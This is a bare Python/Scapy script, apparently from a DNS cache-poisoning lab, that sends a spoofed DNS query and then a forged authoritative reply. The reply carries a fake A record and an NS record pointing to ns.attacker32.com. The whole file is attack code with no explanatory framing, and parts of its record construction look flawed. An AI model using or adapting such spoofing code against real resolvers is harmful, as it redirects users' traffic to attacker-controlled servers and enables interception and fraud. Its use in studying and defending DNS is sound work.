from scapy.all import *

Qdsec = DNSQR(qname='www.qq.example.com')
dns = DNS(id=0xAAAA, qr=0, qdcount=1, ancount=0, nscount=0,arcount=0, qd=Qdsec)
ip = IP(dst='10.0.2.5', src='10.0.2.6')
udp = UDP(dport=53, sport=46131, chksum=0)
request = ip/udp/dns
send(request)

name = 'www.qq.example.com'
domain = 'ns.attacker32.com'
ns = '10.0.2.4'
Qdsec = DNSQR(qname=name)
Anssec = DNSRR(rrname=name, type='A', rdata='1.2.3.4', ttl=259200)
NSsec = DNSRR(rrname=domain, type='NS', rdata=ns, ttl=259200)
dns = DNS(id=0xAAAA, aa=1, rd=1, qr=1,qdcount=1, ancount=1, nscount=1, arcount=0,qd=Qdsec, an=Anssec, ns=NSsec)
ip = IP(dst='10.0.2.5', src='10.0.2.8')
udp = UDP(dport=53, sport=46413, chksum=0)
reply = ip/udp/dns
send(reply)
